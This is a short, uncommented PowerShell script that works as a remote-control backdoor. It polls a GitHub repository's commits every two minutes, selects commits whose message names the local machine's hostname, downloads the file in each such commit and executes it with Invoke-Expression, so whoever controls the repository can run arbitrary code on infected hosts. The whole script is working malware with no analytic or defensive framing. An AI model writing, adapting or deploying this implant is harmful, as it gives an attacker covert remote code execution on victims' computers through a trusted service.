$url = "https://api.github.com/repos/PistiliyaTheBest/fun/commits"
$hostname = HOSTNAME.EXE
$current_directory = Get-Location
$current = $current_directory.ToString() + "\data.txt"
if (-not [System.IO.File]::Exists($current)){
    New-Item -Path $current -ItemType File
}
$other = New-Object -TypeName 'System.Collections.ArrayList'

while ($true){
    $commits = Invoke-RestMethod -Uri $url
    foreach ($commit in $commits) {
        $message = $commit.commit.message
        if (-not ($message -ilike '*' + $hostname.ToString())){
            continue
        }

        $other = Get-Content $current
        if ($message -in $other){
            continue
        }

        $contents = Invoke-RestMethod -Uri ($url + "/" + $commit.sha.ToString())
        $file =  $contents.files[0]
        $file_content = Invoke-WebRequest -Uri $file.raw_url
        Invoke-Expression $file_content
        $message | Add-Content -Path $current
    }
    Start-Sleep 120
}
